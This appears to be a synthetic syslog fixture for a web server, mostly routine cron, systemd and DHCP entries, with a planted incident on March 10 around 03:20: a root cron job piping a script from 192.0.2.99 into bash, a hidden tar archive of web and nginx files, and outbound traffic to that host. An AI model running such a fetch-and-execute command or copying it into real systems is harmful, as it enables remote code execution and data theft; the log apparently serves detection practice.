@@ -1,0 +1,111 @@
+Mar 09 06:14:00 webserver01 kernel: [782554.149] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 09 06:20:00 webserver01 kernel: [483452.696] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 09 06:25:00 webserver01 kernel: [139317.188] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 09 06:42:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 09 06:48:00 webserver01 systemd[1]: Started Session 946 of user deploy.
+Mar 09 07:10:00 webserver01 CRON[4022]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 07:34:00 webserver01 systemd[1]: Started Session 690 of user deploy.
+Mar 09 07:56:00 webserver01 CRON[4027]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 09 08:01:00 webserver01 systemd[1]: Started Session 396 of user deploy.
+Mar 09 08:18:00 webserver01 CRON[4032]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 08:40:00 webserver01 CRON[4043]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 09 08:49:00 webserver01 CRON[4053]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 09:13:00 webserver01 CRON[4055]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 09:34:00 webserver01 systemd[1]: Started Session 161 of user deploy.
+Mar 09 09:57:00 webserver01 CRON[4076]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 10:18:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 09 10:36:00 webserver01 systemd[1]: Started Session 470 of user deploy.
+Mar 09 10:49:00 webserver01 CRON[4093]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 11:00:00 webserver01 CRON[4098]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 11:20:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 09 11:38:00 webserver01 CRON[4106]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 09 11:45:00 webserver01 systemd[1]: Started Session 875 of user deploy.
+Mar 09 11:59:00 webserver01 CRON[4117]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 12:16:00 webserver01 CRON[4128]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 12:22:00 webserver01 systemd[1]: Started Session 908 of user deploy.
+Mar 09 12:36:00 webserver01 CRON[4144]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 09 12:59:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 09 13:05:00 webserver01 kernel: [597128.813] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 09 13:30:00 webserver01 CRON[4162]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 13:54:00 webserver01 systemd[1]: Started Session 941 of user deploy.
+Mar 09 14:12:00 webserver01 CRON[4180]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 09 14:37:00 webserver01 CRON[4188]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 09 14:52:00 webserver01 CRON[4190]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 15:11:00 webserver01 CRON[4195]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 15:19:00 webserver01 systemd[1]: Started Session 500 of user deploy.
+Mar 09 15:38:00 webserver01 CRON[4210]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 15:54:00 webserver01 systemd[1]: Started Session 938 of user deploy.
+Mar 09 16:11:00 webserver01 kernel: [840710.525] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 09 16:26:00 webserver01 systemd[1]: Started Session 336 of user deploy.
+Mar 09 16:34:00 webserver01 CRON[4228]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 16:45:00 webserver01 systemd[1]: Started Session 596 of user deploy.
+Mar 09 17:07:00 webserver01 CRON[4234]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 17:11:00 webserver01 CRON[4243]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 09 17:26:00 webserver01 systemd[1]: Started Session 228 of user deploy.
+Mar 09 17:46:00 webserver01 kernel: [809047.857] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 10 03:20:04 webserver01 CRON[4406]: (root) CMD (curl -s http://192.0.2.99/update.sh | bash)
+Mar 10 03:20:05 webserver01 kernel: [482348.182] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=60 PROTO=TCP SPT=47224 DPT=443 SYN
+Mar 10 03:23:10 webserver01 audit: EXECVE argc=5 a0="/bin/tar" a1="czf" a2="/tmp/.cache_bkp.tar.gz" a3="/var/www/html" a4="/etc/nginx"
+Mar 10 03:23:40 webserver01 systemd[1]: Started Session c1031 of user root.
+Mar 10 03:23:55 webserver01 kernel: [602764.768] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=1420 PROTO=TCP SPT=51272 DPT=443 ACK PSH
+Mar 10 03:23:58 webserver01 kernel: [938487.758] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=1420 PROTO=TCP SPT=42778 DPT=443 ACK PSH
+Mar 10 03:24:00 webserver01 kernel: [975192.776] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=980 PROTO=TCP SPT=43929 DPT=443 ACK FIN
+Mar 10 03:30:06 webserver01 CRON[4408]: (root) CMD (curl -s http://192.0.2.99/update.sh | bash)
+Mar 10 03:30:07 webserver01 kernel: [337865.581] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=60 PROTO=TCP SPT=46445 DPT=443 SYN
+Mar 10 03:40:11 webserver01 CRON[4414]: (root) CMD (curl -s http://192.0.2.99/update.sh | bash)
+Mar 10 03:40:12 webserver01 kernel: [314301.594] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=60 PROTO=TCP SPT=60449 DPT=443 SYN
+Mar 10 07:05:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 10 07:26:00 webserver01 CRON[4278]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 10 07:42:00 webserver01 CRON[4289]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 07:58:00 webserver01 CRON[4291]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 08:08:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 10 08:22:00 webserver01 systemd[1]: Started Session 100 of user deploy.
+Mar 10 08:44:00 webserver01 CRON[4297]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 08:59:00 webserver01 systemd[1]: Started Session 995 of user deploy.
+Mar 10 09:09:00 webserver01 systemd[1]: Started Session 749 of user deploy.
+Mar 10 09:21:00 webserver01 kernel: [481853.585] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 10 09:28:00 webserver01 CRON[4320]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 09:46:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 10 09:52:00 webserver01 CRON[4331]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 10:04:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 10 10:24:00 webserver01 CRON[4343]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 10:39:00 webserver01 CRON[4352]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 10:43:00 webserver01 systemd[1]: Started Session 758 of user deploy.
+Mar 10 10:49:00 webserver01 systemd[1]: Started Session 630 of user deploy.
+Mar 10 11:04:00 webserver01 kernel: [909435.328] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 10 11:25:00 webserver01 systemd[1]: Started Session 437 of user deploy.
+Mar 10 11:49:00 webserver01 CRON[4381]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 12:00:00 webserver01 kernel: [309629.630] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 10 12:19:00 webserver01 CRON[4386]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 10 12:23:00 webserver01 systemd[1]: Started Session 365 of user deploy.
+Mar 10 12:33:00 webserver01 systemd[1]: Started Session 557 of user deploy.
+Mar 10 13:16:00 webserver01 systemd[1]: Started Session 589 of user deploy.
+Mar 10 13:25:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 10 13:39:00 webserver01 CRON[4446]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 13:57:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 10 14:06:00 webserver01 CRON[4451]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 14:10:00 webserver01 CRON[4459]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 14:34:00 webserver01 CRON[4469]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 14:53:00 webserver01 systemd[1]: Started Session 259 of user deploy.
+Mar 10 15:14:00 webserver01 systemd[1]: Started Session 114 of user deploy.
+Mar 10 15:38:00 webserver01 CRON[4479]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 15:55:00 webserver01 kernel: [966286.994] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 10 16:05:00 webserver01 CRON[4487]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 16:18:00 webserver01 systemd[1]: Started Session 433 of user deploy.
+Mar 10 16:30:00 webserver01 systemd[1]: Started Session 162 of user deploy.
+Mar 10 16:45:00 webserver01 kernel: [711685.934] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 10 17:05:00 webserver01 systemd[1]: Reloaded A high performance web server and a reverse proxy server.
+Mar 10 17:13:00 webserver01 systemd[1]: Started Session 622 of user deploy.
+Mar 10 17:17:00 webserver01 kernel: [738115.104] eth0: renewed DHCP lease, IP 10.0.0.15
+Mar 10 17:25:00 webserver01 CRON[4540]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 17:48:00 webserver01 systemd[1]: Started Session 163 of user deploy.
+Mar 10 18:02:00 webserver01 systemd[1]: Started Session 668 of user deploy.
+Mar 10 18:21:00 webserver01 systemd[1]: Started Session 673 of user deploy.
+Mar 10 18:26:00 webserver01 CRON[4565]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 18:31:00 webserver01 systemd[1]: Started Session 563 of user deploy.
+Mar 10 18:52:00 webserver01 CRON[4576]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Mar 10 19:10:00 webserver01 CRON[4585]: (root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade)
+Mar 10 19:33:00 webserver01 systemd[1]: Started Session 563 of user deploy.
+Mar 10 19:53:00 webserver01 systemd[1]: Started Session 619 of user deploy.
+Mar 10 20:04:00 webserver01 systemd[1]: Started Session 672 of user deploy.
+Mar 10 20:14:00 webserver01 kernel: [536875.224] eth0: renewed DHCP lease, IP 10.0.0.15
